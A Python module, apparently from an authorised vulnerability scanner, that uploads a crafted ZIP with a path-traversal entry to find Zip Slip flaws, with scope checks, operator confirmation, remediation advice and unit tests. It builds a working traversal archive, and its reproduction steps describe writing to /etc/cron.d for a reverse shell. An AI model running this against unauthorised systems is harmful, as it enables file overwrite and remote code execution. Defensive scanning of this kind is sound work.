"""Zip Slip scanner — path traversal via archive extraction."""
from __future__ import annotations

import asyncio
import io
import sys
import time
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_ZIP_SLIP = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
CVSS40_ZIP_SLIP = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
PROBE_FILENAME = "../../../../tmp/FORGE_ZIPSLIP_TEST.txt"
PROBE_CONTENT  = b"FORGE_ZIPSLIP_PROBE_DO_NOT_IGNORE"
PROBE_CHECK_PATHS = [
    "/tmp/FORGE_ZIPSLIP_TEST.txt",
    "/FORGE_ZIPSLIP_TEST.txt",
]

UPLOAD_PATHS = [
    "/upload", "/api/upload", "/file/upload", "/import",
    "/api/import", "/extract", "/api/extract",
    "/admin/upload", "/bulk/upload",
]


class ZipSlip(BaseModule):
    """Zip Slip path traversal via archive extraction scanner."""

    NAME        = "zip_slip"
    DESCRIPTION = "Test archive upload endpoints for Zip Slip path traversal (CVE-2018-1000031 class)"
    PHASE       = 10
    TAGS        = ["advanced", "zip-slip", "path-traversal", "rce", "cwe-22"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Find upload endpoints that might accept archives
        upload_eps = await self._find_archive_endpoints(target)
        if not upload_eps:
            self.log.info("No archive upload endpoints found")
            return self._make_result(start)

        confirmed = self.confirm_action(
            module=self.NAME,
            action=f"Test {len(upload_eps)} endpoint(s) for Zip Slip vulnerability",
            target=target,
            risk=(
                "Uploads a ZIP archive containing a probe file with path traversal name. "
                "Probe file is inert text — no executable content."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        malicious_zip = self._create_traversal_zip()

        sem = asyncio.Semaphore(2)
        tasks = [self._test_zip_slip(url, malicious_zip, target, sem)
                 for url in upload_eps]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    def _create_traversal_zip(self) -> bytes:
        """Create a ZIP archive with a path-traversal filename."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            # Normal file
            zf.writestr("normal.txt", "normal file content")
            # Traversal file
            info = zipfile.ZipInfo(PROBE_FILENAME)
            zf.writestr(info, PROBE_CONTENT.decode())
        return buf.getvalue()

    async def _find_archive_endpoints(self, target: str) -> list[str]:
        found: list[str] = []
        for path in UPLOAD_PATHS:
            url = f"{target}{path}"
            await self.rate_limit()
            try:
                import aiohttp
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.get(
                        url, timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status in (200, 405):
                            found.append(url)
            except Exception:
                pass

        # Also use crawled forms that accept files
        for form in self.config.extra.get("found_forms", []):
            if form.get("method") == "POST":
                action = form.get("action", "")
                if any(kw in str(form).lower() or kw in action.lower()
                       for kw in ["upload", "file", "import", "zip", "archive"]):
                    full = action if action.startswith("http") else f"{target.rstrip('/')}/{action.lstrip('/')}"
                    found.append(full)

        return list(dict.fromkeys(found))[:10]

    async def _test_zip_slip(
        self, url: str, zip_bytes: bytes, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return
            await self.rate_limit()

            try:
                import aiohttp

                # Upload the traversal zip
                form_data = aiohttp.FormData()
                form_data.add_field(
                    "file",
                    io.BytesIO(zip_bytes),
                    filename="probe.zip",
                    content_type="application/zip",
                )
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.post(
                        url, data=form_data, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")

                if resp.status not in (200, 201, 202):
                    return

                # Check if probe file was extracted to a traversal path
                for check_path in PROBE_CHECK_PATHS:
                    check_url = f"{target}{check_path}"
                    if not self.check_scope(check_url):
                        continue
                    await self.rate_limit()
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            check_url, timeout=aiohttp.ClientTimeout(total=5)
                        ) as resp2:
                            resp2_body = await resp2.text(errors="ignore")

                    if resp2.status == 200 and PROBE_CONTENT.decode() in resp2_body:
                        ev = Evidence(
                            request_raw=f"POST {url} (probe.zip with traversal path)",
                            response_raw=f"Probe found at {check_url}: {resp2_body[:200]}",
                            extra={
                                "upload_url":      url,
                                "probe_filename":  PROBE_FILENAME,
                                "extracted_to":    check_url,
                            },
                        )
                        self.new_finding(
                            title=f"Zip Slip — Path Traversal via Archive Extraction ({url})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Zip Slip vulnerability at {url}. "
                                f"Archive with traversal path '{PROBE_FILENAME}' "
                                f"was extracted to {check_url}. "
                                "An attacker can overwrite arbitrary files including web shells, "
                                "config files, or SSH authorized_keys."
                            ),
                            reproduction_steps=[
                                "Create evil.zip with entry: ../../../../etc/cron.d/shell",
                                f"POST to {url}",
                                "Cron job executes reverse shell",
                            ],
                            remediation=(
                                "Validate zip entry paths after extraction: "
                                "ensure canonical path is within intended extraction directory. "
                                "Python: Path(dest/entry).resolve().is_relative_to(extract_dir)\n"
                                "Java: Use Apache Commons Compress with path traversal protection."
                            ),
                            references=["CVE-2018-1000031 class", "CWE-22",
                                       "https://snyk.io/research/zip-slip-vulnerability"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_ZIP_SLIP,
                            cvss_v40_vector=CVSS40_ZIP_SLIP,
                            mitre_attack=["TA0002/T1190"],
                            target=target,
                            url=url,
                            operator_confirmed=True,
                        )
                        return

            except Exception as exc:
                self.log.debug("Zip Slip test failed for %s: %s", url, exc)


class TestZipSlip:
    def test_create_traversal_zip(self) -> None:
        mod = ZipSlip.__new__(ZipSlip)
        zip_bytes = mod._create_traversal_zip()
        assert len(zip_bytes) > 0
        # Verify it's a valid ZIP
        buf = io.BytesIO(zip_bytes)
        with zipfile.ZipFile(buf, "r") as zf:
            names = zf.namelist()
        assert any("FORGE_ZIPSLIP" in name for name in names)

    def test_probe_filename_has_traversal(self) -> None:
        assert "../" in PROBE_FILENAME

    def test_probe_content(self) -> None:
        assert len(PROBE_CONTENT) > 10
